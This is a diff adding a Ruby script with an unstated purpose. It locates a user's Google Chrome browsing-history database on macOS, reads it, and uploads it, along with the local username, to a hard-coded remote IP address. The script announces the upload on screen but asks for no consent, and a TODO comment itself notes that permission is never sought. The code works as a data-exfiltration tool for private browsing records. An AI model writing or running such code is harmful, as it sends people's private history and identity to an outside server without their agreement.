@@ -1,0 +1,57 @@
+#!/usr/bin/env ruby
+
+require 'net/http'
+require 'uri'
+require 'digest/md5'
+require 'open-uri'
+
+class String
+  # colorization
+  def colorize(color_code)
+    "\e[#{color_code}m#{self}\e[0m"
+  end
+
+  def red; colorize(31); end
+  def green; colorize(32); end
+  def yellow; colorize(33); end
+  def blue; colorize(34); end
+  def pink; colorize(35); end
+  def light_blue; colorize(36); end
+end
+
+endpoint = URI.parse('http://159.203.6.69:36787/upload')
+
+puts "Looking for your browser history..."
+
+# TODO: extend this search to account for Firefox and Safari's history storage
+folder = File.expand_path("~/Library/Application\ Support/Google/Chrome")
+query = "#{folder}/*/History"
+
+matches = Dir.glob(query)
+sorted = matches.sort_by { |f| File.size(f) }.reverse
+best_match = sorted.first
+
+# TODO: ask first if it's okay if we use their name
+user = `whoami`
+
+puts "Uploading history data from #{'Google Chrome'.yellow}..."
+
+data = File.read(best_match)
+http = Net::HTTP.new(endpoint.host, endpoint.port)
+req = Net::HTTP::Post.new(endpoint.path)
+
+res = http.post(endpoint.path, data, {
+  'Content-Type' => 'application/octet-stream',
+  'X-User-Name' => user
+})
+
+case res
+when Net::HTTPSuccess, Net::HTTPRedirection
+  puts "Success!".green if res.is_a?(Net::HTTPSuccess)
+else
+  begin
+    res.value
+  rescue => e
+    puts "#{'Error:'.red} #{e.message}"
+  end
+end
